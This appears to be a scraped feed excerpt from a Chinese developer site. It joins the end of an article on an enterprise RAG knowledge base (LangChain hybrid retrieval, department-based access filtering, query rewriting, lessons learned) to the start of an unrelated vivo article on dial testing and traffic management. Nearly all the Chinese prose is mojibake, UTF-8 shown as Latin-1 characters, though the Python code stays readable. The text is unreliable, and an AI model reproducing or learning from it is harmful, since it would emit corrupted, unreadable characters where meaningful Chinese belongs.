<p>æˆ‘ä»¬çš„åšæ³•å¾ˆç®€å•ï¼š<strong>åœ¨æ–‡æ¡£å…¥åº“æ—¶æ‰“æ ‡ç­¾ï¼Œæ£€ç´¢æ—¶è¿‡æ»¤ã€‚</strong></p>
<h3 data-id="heading-8">æ–‡æ¡£å…¥åº“</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–‡æ¡£å…ƒæ•°æ®</span>
{
    <span class="hljs-string">"content"</span>: <span class="hljs-string">"å·®æ—…ä½å®¿æ ‡å‡†..."</span>,
    <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"department"</span>: <span class="hljs-string">"finance"</span>,      <span class="hljs-comment"># æ‰€å±éƒ¨é—¨</span>
        <span class="hljs-string">"doc_type"</span>: <span class="hljs-string">"policy"</span>,          <span class="hljs-comment"># æ–‡æ¡£ç±»å‹</span>
        <span class="hljs-string">"is_latest"</span>: true,             <span class="hljs-comment"># æ˜¯å¦æœ€æ–°ç‰ˆæœ¬</span>
        <span class="hljs-string">"update_time"</span>: <span class="hljs-string">"2024-12-01"</span>
    }
}
</code></pre>
<h3 data-id="heading-9">æ£€ç´¢æ—¶è¿‡æ»¤</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”¨æˆ·ç™»å½•åï¼Œè·å–éƒ¨é—¨ä¿¡æ¯</span>
user_department = <span class="hljs-string">"finance"</span>

<span class="hljs-comment"># ESæ£€ç´¢æ—¶åŠ filter</span>
es_filter = {
    <span class="hljs-string">"department"</span>: user_department
}

<span class="hljs-comment"># å‘é‡æ£€ç´¢æ—¶ä¹ŸåŠ filter</span>
vector_filter = {
    <span class="hljs-string">"department"</span>: user_department
}
</code></pre>
<p>è¿™æ ·å°±èƒ½ä¿è¯ï¼š</p>
<ul>
<li>è´¢åŠ¡éƒ¨å‘˜å·¥åªèƒ½æœåˆ°è´¢åŠ¡æ–‡æ¡£</li>
<li>HRéƒ¨å‘˜å·¥åªèƒ½æœåˆ°HRæ–‡æ¡£</li>
<li>å®Œå…¨åœ¨æ£€ç´¢å±‚é¢éš”ç¦»ï¼Œä¸æ˜¯ç”Ÿæˆæ—¶æ‰è¿‡æ»¤</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å‘˜å·¥ç™»å½•] --&gt; B{èº«ä»½è®¤è¯}
    B --&gt;|è´¢åŠ¡éƒ¨| C[æ£€ç´¢è´¢åŠ¡æ–‡æ¡£]
    B --&gt;|HRéƒ¨| D[æ£€ç´¢HRæ–‡æ¡£]
    B --&gt;|ITéƒ¨| E[æ£€ç´¢ITæ–‡æ¡£]
    C --&gt; F[æ··åˆæ£€ç´¢]
    D --&gt; F
    E --&gt; F
    F --&gt; G[LLMç”Ÿæˆç­”æ¡ˆ]
    
    style A fill:#e1f5ff
    style B fill:#ffe1e1
    style C fill:#e1ffe1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#fff4e1
    style G fill:#e1f5ff
</code></pre>
<h2 data-id="heading-10">ä¸ƒã€æŠ€æœ¯å®ç°</h2>
<p>æ•´ä¸ªç³»ç»ŸåŸºäºLangChainæ„å»ºï¼Œä¸»è¦ç»„ä»¶ï¼š</p>
<h3 data-id="heading-11">1. æ–‡æ¡£å¤„ç†</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.text_splitter <span class="hljs-keyword">import</span> RecursiveCharacterTextSplitter

<span class="hljs-comment"># æ–‡æ¡£åˆ†å—</span>
text_splitter = RecursiveCharacterTextSplitter(
    chunk_size=<span class="hljs-number">500</span>,
    chunk_overlap=<span class="hljs-number">50</span>
)

chunks = text_splitter.split_documents(documents)
</code></pre>
<h3 data-id="heading-12">2. åŒè·¯æ£€ç´¢</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.retrievers <span class="hljs-keyword">import</span> EnsembleRetriever
<span class="hljs-keyword">from</span> langchain.vectorstores <span class="hljs-keyword">import</span> FAISS
<span class="hljs-keyword">from</span> langchain.retrievers <span class="hljs-keyword">import</span> BM25Retriever

<span class="hljs-comment"># Elasticsearchæ£€ç´¢å™¨</span>
bm25_retriever = BM25Retriever.from_documents(chunks)
bm25_retriever.k = <span class="hljs-number">10</span>

<span class="hljs-comment"># å‘é‡æ£€ç´¢å™¨</span>
vectorstore = FAISS.from_documents(chunks, embeddings)
vector_retriever = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">10</span>})

<span class="hljs-comment"># æ··åˆæ£€ç´¢</span>
ensemble_retriever = EnsembleRetriever(
    retrievers=[bm25_retriever, vector_retriever],
    weights=[<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>]
)
</code></pre>
<h3 data-id="heading-13">3. Queryé‡å†™</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain.chat_models <span class="hljs-keyword">import</span> ChatAnthropic

rewrite_prompt = ChatPromptTemplate.from_messages([
    (<span class="hljs-string">"system"</span>, <span class="hljs-string">"æ ¹æ®å¯¹è¯å†å²ï¼Œå°†ç”¨æˆ·çš„ç®€çŸ­é—®é¢˜è¡¥å…¨ä¸ºå®Œæ•´çš„é—®é¢˜ã€‚"</span>),
    (<span class="hljs-string">"human"</span>, <span class="hljs-string">"å¯¹è¯å†å²ï¼š{history}\nå½“å‰é—®é¢˜ï¼š{question}"</span>)
])

llm = ChatAnthropic(model=<span class="hljs-string">"claude-sonnet-4-20250514"</span>)
rewrite_chain = rewrite_prompt | llm
</code></pre>
<h3 data-id="heading-14">4. å®Œæ•´æµç¨‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain.chains <span class="hljs-keyword">import</span> ConversationalRetrievalChain

<span class="hljs-comment"># æ„å»ºé—®ç­”é“¾</span>
qa_chain = ConversationalRetrievalChain.from_llm(
    llm=llm,
    retriever=ensemble_retriever,
    return_source_documents=<span class="hljs-literal">True</span>,
    verbose=<span class="hljs-literal">True</span>
)

<span class="hljs-comment"># æ‰§è¡ŒæŸ¥è¯¢</span>
result = qa_chain({
    <span class="hljs-string">"question"</span>: user_question,
    <span class="hljs-string">"chat_history"</span>: chat_history
})
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·æé—®] --&gt; B[æƒé™æ£€æŸ¥]
    B --&gt; C{æ˜¯å¦å¤šè½®?}
    C --&gt;|æ˜¯| D[LLMé‡å†™é—®é¢˜]
    C --&gt;|å¦| E[ä½¿ç”¨åŸé—®é¢˜]
    D --&gt; F[æ··åˆæ£€ç´¢]
    E --&gt; F
    F --&gt; G[æ–‡æ¡£æ’åº]
    G --&gt; H[LLMç”Ÿæˆç­”æ¡ˆ]
    H --&gt; I[è¿”å›ç»“æœ]
    
    style A fill:#e1f5ff
    style B fill:#ffe1e1
    style C fill:#fff4e1
    style D fill:#fff4e1
    style E fill:#e1ffe1
    style F fill:#ffe1f5
    style G fill:#ffe1f5
    style H fill:#fff4e1
    style I fill:#e1f5ff
</code></pre>
<h2 data-id="heading-15">å…«ã€å®é™…æ•ˆæœ</h2>
<p>ç³»ç»Ÿä¸Šçº¿ä¸‰ä¸ªæœˆåï¼Œæˆ‘ä»¬çœ‹äº†ä¸‹æ•°æ®ï¼š</p>
<p><strong>é—®ç­”å‡†ç¡®ç‡ï¼š</strong></p>
<ul>
<li>å•æ¬¡é—®ç­”ï¼š85%ä»¥ä¸Š</li>
<li>å¤šè½®å¯¹è¯ï¼š78%å·¦å³</li>
</ul>
<p><strong>å¬å›ç‡æå‡ï¼š</strong></p>
<ul>
<li>çº¯ESï¼š62%</li>
<li>çº¯å‘é‡ï¼š71%</li>
<li>æ··åˆæ£€ç´¢ï¼š89%</li>
</ul>
<p><strong>å…¸å‹æˆåŠŸæ¡ˆä¾‹ï¼š</strong></p>
<ol>
<li>"æŠ¥é”€éœ€è¦ä»€ä¹ˆå‘ç¥¨ï¼Ÿ" â†’ å‡†ç¡®æ‰¾åˆ°ã€Šå·®æ—…æŠ¥é”€åˆ¶åº¦ã€‹</li>
<li>"å¿˜è®°å¯†ç æ€ä¹ˆåŠï¼Ÿ" â†’ å‡†ç¡®æ‰¾åˆ°ã€ŠITè‡ªåŠ©æœåŠ¡æŒ‡å—ã€‹ï¼ˆå‘é‡ç†è§£è¯­ä¹‰ï¼‰</li>
<li>"HR-Linkç™»å½•åœ°å€ï¼Ÿ" â†’ ç²¾ç¡®åŒ¹é…å†…éƒ¨ç³»ç»Ÿæ–‡æ¡£ï¼ˆESç²¾ç¡®åŒ¹é…ï¼‰</li>
<li>"æˆ‘ç™»ä¸ä¸Šä»£ç å¹³å°" â†’ å‡†ç¡®æ‰¾åˆ°GitLabç›¸å…³æ–‡æ¡£ï¼ˆå‘é‡ç†è§£å£è¯­ï¼‰</li>
</ol>
<p><strong>å…¸å‹å¤±è´¥æ¡ˆä¾‹ï¼š</strong></p>
<ol>
<li>"èƒ½ä¸èƒ½æå‰æŠ¥é”€ï¼Ÿ" â†’ æ–‡æ¡£æ²¡æœ‰è¿™ä¸ªä¾‹å¤–æƒ…å†µ</li>
<li>"å»å¹´çš„åˆ¶åº¦æ˜¯æ€æ ·çš„ï¼Ÿ" â†’ æ—§ç‰ˆæœ¬æ–‡æ¡£è¢«é™æƒäº†</li>
</ol>
<h2 data-id="heading-16">ä¹ã€è¸©è¿‡çš„å‘</h2>
<h3 data-id="heading-17">å‘1ï¼šåˆ†å—å¤§å°</h3>
<p>æœ€å¼€å§‹æˆ‘ä»¬è®¾ç½®chunk_size=1000ï¼Œç»“æœå‘ç°å¾ˆå¤šé—®é¢˜åªéœ€è¦ä¸€å¥è¯å°±èƒ½å›ç­”ï¼Œä½†ç³»ç»Ÿè¿”å›äº†ä¸€å¤§æ®µæ— å…³å†…å®¹ã€‚</p>
<p>åæ¥æ”¹æˆ500ï¼Œæ•ˆæœå¥½å¤šäº†ã€‚</p>
<h3 data-id="heading-18">å‘2ï¼šå‘é‡æ¨¡å‹é€‰æ‹©</h3>
<p>ä¸€å¼€å§‹ç”¨çš„è‹±æ–‡æ¨¡å‹ï¼Œä¸­æ–‡æ•ˆæœå¾ˆå·®ã€‚åæ¥æ¢æˆBGEä¸­æ–‡æ¨¡å‹ï¼Œå‡†ç¡®ç‡ç›´æ¥æå‡20%ã€‚</p>
<h3 data-id="heading-19">å‘3ï¼šæƒé™è¿‡æ»¤çš„ä½ç½®</h3>
<p>æœ€å¼€å§‹æ˜¯æ£€ç´¢å®Œå†è¿‡æ»¤ï¼Œç»“æœå‘ç°å¯èƒ½æ£€ç´¢20æ¡ï¼Œè¿‡æ»¤ååªå‰©3æ¡ã€‚</p>
<p>æ”¹æˆæ£€ç´¢å‰å°±åŠ filterï¼Œé—®é¢˜è§£å†³ã€‚</p>
<h3 data-id="heading-20">å‘4ï¼šæ–‡æ¡£æ›´æ–°ä¸åŒæ­¥</h3>
<p>Elasticsearchæ›´æ–°äº†ï¼Œå‘é‡åº“æ²¡æ›´æ–°ï¼Œå¯¼è‡´è¿”å›çš„å†…å®¹ä¸ä¸€è‡´ã€‚</p>
<p>åæ¥åŠ äº†ç‰ˆæœ¬å·æœºåˆ¶ï¼Œå¼ºåˆ¶åŒæ­¥æ›´æ–°ã€‚</p>
<h2 data-id="heading-21">åã€æ€»ç»“</h2>
<p>å›è¿‡å¤´çœ‹ï¼Œæ•´ä¸ªæ–¹æ¡ˆçš„æ ¸å¿ƒå…¶å®å°±ä¸‰ç‚¹ï¼š</p>
<ol>
<li>
<p><strong>æ··åˆæ£€ç´¢è§£å†³äº†å•ä¸€æ–¹æ¡ˆçš„ç›²åŒº</strong></p>
<ul>
<li>ESä¿è¯ç²¾ç¡®åŒ¹é…</li>
<li>å‘é‡ä¿è¯è¯­ä¹‰ç†è§£</li>
</ul>
</li>
<li>
<p><strong>Queryé‡å†™è§£å†³äº†å¤šè½®å¯¹è¯é—®é¢˜</strong></p>
<ul>
<li>ä¸èƒ½ç®€å•åœ°ç”¨åŸå§‹é—®é¢˜æ£€ç´¢</li>
<li>éœ€è¦è¡¥å…¨ä¸Šä¸‹æ–‡</li>
</ul>
</li>
<li>
<p><strong>å…ƒæ•°æ®è¿‡æ»¤è§£å†³äº†æƒé™éš”ç¦»</strong></p>
<ul>
<li>æ£€ç´¢å‰å°±è¿‡æ»¤</li>
<li>ä¸æ˜¯ç”Ÿæˆæ—¶æ‰æ§åˆ¶</li>
</ul>
</li>
</ol>
<p>è¿™ä¸æ˜¯ä»€ä¹ˆé«˜æ·±çš„æŠ€æœ¯ï¼Œå°±æ˜¯é’ˆå¯¹çœŸå®ä¸šåŠ¡åœºæ™¯ï¼Œä¸€æ­¥æ­¥è§£å†³å®é™…é—®é¢˜ã€‚</p>
<p>æœ€é‡è¦çš„æ˜¯ï¼š<strong>ä¸è¦è¿·ä¿¡æŸä¸€ç§æ–¹æ¡ˆï¼Œè¦æ ¹æ®å®é™…æƒ…å†µç»„åˆä½¿ç”¨ã€‚</strong></p>
<p>å…³é”®è¯æ£€ç´¢å’Œå‘é‡æ£€ç´¢ï¼Œä¸æ˜¯æ›¿ä»£å…³ç³»ï¼Œè€Œæ˜¯äº’è¡¥å…³ç³»ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ç»™æ­£åœ¨åšä¼ä¸šçŸ¥è¯†åº“çš„åŒå­¦ä¸€äº›å‚è€ƒã€‚</p>
<p>å¦‚æœæœ‰é—®é¢˜ï¼Œæ¬¢è¿è®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ]]></title>    <link>https://juejin.cn/post/7592440247957553167</link>    <guid>https://juejin.cn/post/7592440247957553167</guid>    <pubDate>2026-01-08T02:47:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592440247957553167" data-draft-id="7592439090097340459" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ"/> <meta itemprop="keywords" content="è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-08T02:47:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="vivoäº’è”ç½‘æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/993614243303053"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ™ºå–æµé‡ï¼Œæ•ˆèµ¢å¢é•¿-æ‹¨æµ‹å’Œèåˆæµé‡ç®¡ç†ä¸šåŠ¡èµ‹èƒ½å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614243303053/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    vivoäº’è”ç½‘æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:47:55.000Z" title="Thu Jan 08 2026 02:47:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ï¼šäº’è”ç½‘è¿ç»´æŠ€æœ¯ä¿éšœå›¢é˜Ÿ-Mo Hanã€Zhou Jianhua</p>
<p>åœ¨é£é€Ÿå‘å±•çš„äº’è”ç½‘ä¿¡æ¯åŒ–æ—¶ä»£ä¸‹ï¼ŒæŠ“ä½å¹¶å……åˆ†åˆ©ç”¨â€œæµé‡â€å°†ä¸ºä¸šåŠ¡å¢é•¿å¸¦æ¥â€œæ³¼å¤©â€å¯Œè´µï¼Œå·²æˆä¸ºå…±è¯†ã€‚å¦‚ä½•é€šè¿‡çœŸå®ã€æµ·é‡çš„æ•°æ®æ‰“é€ ä¸€ä¸ªé›†æˆæœ¬ã€è´¨é‡ã€æ•ˆç‡äºä¸€ä½“çš„èåˆæµé‡ç®¡ç†å¹³å°ï¼Œä¹Ÿæˆäº†å„è¡Œå„ä¸šçš„å…³æ³¨ç„¦ç‚¹ï¼Œæœ¬æ–‡é€šè¿‡â€æ‹¨æµ‹â€œä¸â€œèåˆæµé‡ç®¡ç†â€ä¸¤ä¸ªç»´åº¦ï¼Œæ¥åˆ†äº«vivoåœ¨æµé‡ç®¡ç†é¢†åŸŸçš„ä¸€äº›å®è·µå’Œæ¢ç´¢ã€‚</p>
<p>æœ¬æ–‡ä¸º2025å¹´ vivo å¼€å‘è€…å¤§ä¼šäº’è”ç½‘æŠ€æœ¯ä¸“åœºåˆ†äº«å†…å®¹ä¹‹ä¸€ï¼Œåœ¨å…¬ä¼—å·å¯¹è¯æ¡†å›å¤ã€2025VDCã€‘è·å– 2025VDC äº’è”ç½‘æŠ€æœ¯ä¼šåœºè®®é¢˜ç›¸å…³èµ„æ–™ã€‚</p>
</blockquote>
<p>1åˆ†é’Ÿçœ‹å›¾æŒæ¡æ ¸å¿ƒè§‚ç‚¹ğŸ‘‡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a9d5bed5a8c4074875672aff62bc2f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=XIm507uvbSefqtJMdp4t0k9XNdQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/909a762cf82248b6840ae5d88d3ea795~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Yn4323KpY4bLZwTjzUaOPTtJlWU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><em>å›¾1 VS å›¾2ï¼Œæ‚¨æ›´å€¾å‘äºå“ªå¼ å›¾æ¥è¾…åŠ©ç†è§£å…¨æ–‡å‘¢ï¼Ÿ</em></p>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯</h2>
<p>åœ¨é£é€Ÿå‘å±•çš„äº’è”ç½‘ä¿¡æ¯åŒ–æ—¶ä»£ä¸‹ï¼ŒæŠ“ä½å¹¶å……åˆ†åˆ©ç”¨â€œæµé‡â€å°†ä¸ºä¸šåŠ¡å¢é•¿å¸¦æ¥â€œæ³¼å¤©â€å¯Œè´µï¼Œå·²æˆä¸ºå…±è¯†ã€‚å¦‚ä½•é€šè¿‡çœŸå®ã€æµ·é‡çš„æ•°æ®æ‰“é€ ä¸€ä¸ªé›†æˆæœ¬ã€è´¨é‡ã€æ•ˆç‡äºä¸€ä½“çš„èåˆæµé‡ç®¡ç†å¹³å°ï¼Œä¹Ÿæˆäº†å„è¡Œå„ä¸šçš„å…³æ³¨ç„¦ç‚¹ï¼Œæœ¬æ–‡é€šè¿‡â€œæ‹¨æµ‹â€ä¸â€œèåˆæµé‡ç®¡ç†â€ä¸¤ä¸ªç»´åº¦ï¼Œæ¥åˆ†äº«vivoåœ¨æµé‡ç®¡ç†é¢†åŸŸçš„ä¸€äº›å®è·µå’Œæ¢ç´¢ã€‚</p>
<h2 data-id="heading-1">äºŒã€å…¨çƒæ‹¨æµ‹</h2>
<h3 data-id="heading-2">2.1 ä»€ä¹ˆæ˜¯æ‹¨æµ‹</h3>
<p>ç®€å•æ¥è¯´ï¼Œæ‹¨æµ‹å°±æ˜¯ä¸€å¥—æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸ºï¼Œä¸»åŠ¨è¿›è¡Œå¥åº·æ£€æŸ¥å’Œæ€§èƒ½æµ‹é‡çš„æ—è·¯ç›‘æ§ç³»ç»Ÿã€‚ å®ƒå°±åƒæˆ‘ä»¬æ´¾å‡ºå»çš„æ— æ•°â€œè§‚å¯Ÿè€…â€ï¼Œé€šè¿‡è¿™äº›â€œè§‚å¯Ÿè€…â€ï¼Œæˆ‘ä»¬ä¸»è¦å¯ä»¥å®ç°ä¸‰å¤§ç›®æ ‡ï¼š</p>
<p>**ä¸€æ˜¯æ€§èƒ½ç›‘æ§ï¼š**å®ƒå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å¯¹æŸä¸ªç½‘ç»œæ¥å£æˆ–è€…ç½‘å€ï¼Œå‘èµ·ä¸»åŠ¨æ¢æµ‹ï¼Œæ£€æµ‹ç½‘ç»œçš„å»¶è¿Ÿã€ä¸¢åŒ…ï¼Œé”™è¯¯ï¼ŒåŠæ—¶å‘ç°ç½‘ç»œé£é™©å’Œæ•…éšœã€‚</p>
<p>**äºŒæ˜¯äº§å“ä¼˜åŒ–ï¼š**ä»ç”¨æˆ·è§†è§’å»å¯¹æ¯”ä¸åŒç‰ˆæœ¬çš„æ€§èƒ½å·®å¼‚ï¼Œä¸ºäº§å“è¿­ä»£æä¾›æ•°æ®æ”¯æŒã€‚</p>
<p>**ä¸‰æ˜¯å¯ç”¨æ€§ç›‘æ§ï¼š**æ¨¡æ‹Ÿç”¨æˆ·ä½¿ç”¨ä¸šåŠ¡åœºæ™¯å’Œå®Œæ•´æµç¨‹ï¼Œè¯„ä¼°ä¸šåŠ¡çš„çœŸå®è´¨é‡ï¼ŒåŠæ—¶å‘ç°ä¸šåŠ¡å¯ç”¨æ€§é—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91db14914c1b4bed9a23b141c1550689~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ymWk6qKGdF8%2BI90bUOpHYY7ilWo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 vivoæ‹¨æµ‹å¹³å°ä»‹ç»</h3>
<p>åœ¨vivoï¼Œæ‹¨æµ‹çš„æ ¸å¿ƒä½¿å‘½ï¼Œå°±æ˜¯ä¸ºæ‰€æœ‰ä¸šåŠ¡å’Œäº§å“é«˜å¯ç”¨ä¿é©¾æŠ¤èˆªï¼Œç½‘ç»œæ€§èƒ½ç›‘æ§ã€ä¸šåŠ¡å¯ç”¨æ€§ç›‘æ§ï¼Œäº§å“ä¼˜åŒ–åˆ†æã€è¿™æ˜¯åŸºç¡€èƒ½åŠ›ï¼Œç¡®ä¿æˆ‘ä»¬çš„æœåŠ¡ç¨³å®šå¯é ã€‚</p>
